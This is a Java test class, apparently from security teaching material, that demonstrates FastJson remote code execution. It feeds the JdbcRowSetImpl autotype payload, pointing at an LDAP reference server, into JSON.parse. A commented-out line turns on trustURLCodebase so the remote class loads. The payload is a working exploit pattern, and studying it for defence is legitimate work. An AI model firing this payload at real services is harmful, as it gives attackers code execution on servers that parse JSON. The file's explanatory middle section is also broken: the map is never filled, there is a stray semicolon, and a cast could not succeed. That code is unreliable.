package com.anbai.sec.jndi.injection;

import com.alibaba.fastjson.JSON;

import java.util.HashMap;

/**
 * Creator: yz
 * Date: 2019/12/28
 */
public class FastJsonRCETest {

    public static void main(String[] args) throws Exception {

        String ldap_url = LDAPReferenceServerTest.LDAP_URL;

//			// 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"" + ldap_url + "\", \"autoCommit\": \"true\" }";


        /*
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:3890/test",
    "autoCommit": "true"
}
        */

        // FastJson
        HashMap<String, Object> map = new HashMap<String, Object>();
        // 这个，是我们要去初始化的类名
        ;
        Class jdbcClass = Class.forName(
                (String) map.get("@type")
                // "com.sun.rowset.JdbcRowSetImpl"
        );
        // new ;
        String dataSourceName = (String) map.get("dataSourceName");
        Boolean autoCommit = (Boolean) map.get("autoCommit");
        //
        Jdbc对象 jdbc对象 = (Jdbc对象) jdbcClass.getConstructor().newInstance();           // 省略…………………………
        jdbc对象.setDataSourceName(dataSourceName);
        jdbc对象.setAutoCommit(autoCommit);

        Object obj = JSON.parse(json);
        System.out.println(obj);
    }

    static class Jdbc对象 {
        String dataSourceName;
        Boolean autoCommit;

        public Jdbc对象() {
        }

        public String getDataSourceName() {
            return dataSourceName;
        }

        public Boolean getAutoCommit() {
            return autoCommit;
        }

        public void setDataSourceName(String dataSourceName) {
            this.dataSourceName = dataSourceName;
        }

        public void setAutoCommit(Boolean autoCommit) {
            this.autoCommit = autoCommit;
        }

    }

}
